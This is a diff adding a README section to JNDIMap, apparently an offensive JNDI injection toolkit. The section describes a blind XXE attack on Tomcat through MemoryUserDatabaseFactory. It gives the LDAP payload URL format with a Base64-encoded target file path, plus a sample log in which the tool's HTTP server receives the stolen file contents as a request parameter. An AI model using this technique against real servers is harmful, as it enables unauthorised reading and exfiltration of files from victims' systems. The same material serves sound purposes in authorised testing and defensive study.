@@ -447,6 +447,28 @@ Usage: java -cp JNDIMap.jar map.jndi.server.DerbyServer [-p <port>] [-g <gadget>
 
 `-h`: show usage
 
+## Tomcat Blind XXE
+
+Use `org.apache.catalina.users.MemoryUserDatabaseFactory` to achieve Blind XXE
+
+The path must be in Base64 URL format
+
+```bash
+# Tomcat XXE
+ldap://127.0.0.1:1389/TomcatXXE/<base64-url-encoded-path>
+```
+
+Due to JDK limitations, XXE can only read single-line files that do not contain special characters. The file contents are sent to the built-in HTTP server as the `content` parameter
+
+```bash
+[LDAP] Received query: /TomcatXXE/L3RtcC90ZXN0LnR4dA==
+[TomcatXXE] Path: /tmp/test.txt
+[LDAP] Sending Reference object (serialized data)
+[HTTP] Receive request: /O5GPr0d7.xml
+[HTTP] Receive request: /TsBaggdL.dtd
+[HTTP] Receive request: /V4J4ZH1P?content=helloworld
+```
+
 ## LDAP Deserialization
 
 Supports Java deserialization via LDAP and LDAP protocols (RMI protocol is not supported)
